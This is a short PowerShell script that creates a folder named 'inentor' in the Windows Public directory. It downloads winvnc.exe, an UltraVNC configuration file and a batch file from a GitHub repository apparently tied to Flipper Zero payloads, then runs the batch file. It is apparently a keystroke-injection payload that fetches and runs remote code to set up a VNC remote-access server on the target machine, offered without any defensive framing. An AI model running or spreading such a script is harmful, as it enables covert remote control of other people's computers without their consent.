# Wait for 1 second
Start-Sleep -Seconds 1

# Get the path to a folder in the Public directory
$publicFolderPath = [System.IO.Path]::Combine($env:PUBLIC, 'inentor')

# Create the folder if it doesn't exist
if (!(Test-Path -Path $publicFolderPath)) {
    New-Item -ItemType Directory -Path $publicFolderPath -Force
}

# Wait for 1 second
Start-Sleep -Seconds 1

# Define URLs for the files to download
$url1 = "https://github.com/TriPaGonski/VNCFLIPPERZERO/raw/main/winvnc.exe"
$url2 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/ultravnc.ini"
$url3 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/Main.bat"

# Define the local file paths
$filePath1 = "$publicFolderPath\winvnc.exe"
$filePath2 = "$publicFolderPath\ultravnc.ini"
$filePath3 = "$publicFolderPath\main.bat"

# Download the files
Invoke-WebRequest -Uri $url1 -OutFile $filePath1
# Wait for 1 second
Start-Sleep -Seconds 1
Invoke-WebRequest -Uri $url2 -OutFile $filePath2
# Wait for 1 second
Start-Sleep -Seconds 1
Invoke-WebRequest -Uri $url3 -OutFile $filePath3
# Wait for 1 second
Start-Sleep -Seconds 1

# List the directory contents to verify files are downloaded
Get-ChildItem -Path $publicFolderPath

# Execute the main.bat file
Start-Process -FilePath $filePath3 -WorkingDirectory $publicFolderPath -NoNewWindow

# Open the file location in File Explorer
Start-Process explorer.exe -ArgumentList "/select,$filePath3"
